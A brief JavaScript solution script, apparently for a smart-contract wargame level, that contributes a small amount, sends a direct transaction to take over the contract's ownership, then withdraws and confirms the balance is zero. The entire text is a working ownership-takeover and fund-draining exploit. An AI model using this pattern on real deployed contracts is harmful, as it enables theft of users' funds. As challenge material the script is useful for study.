async function attack(){

await contract.contribute({from:player,value:1000000000000});
await contract.sendTransaction({value:10000000000000})
let owner=await contract.owner();  
if(owner==player){
    console.log("You claimed the ownership!");
    
}
await contract.withdraw();
let bal = await getBalance(contract.address);
bal=parseInt(bal);
console.log("balance is ",bal);
if(bal==0){
  console.log("Yeyyy , the balance has been dropped to Zero");  
}

}
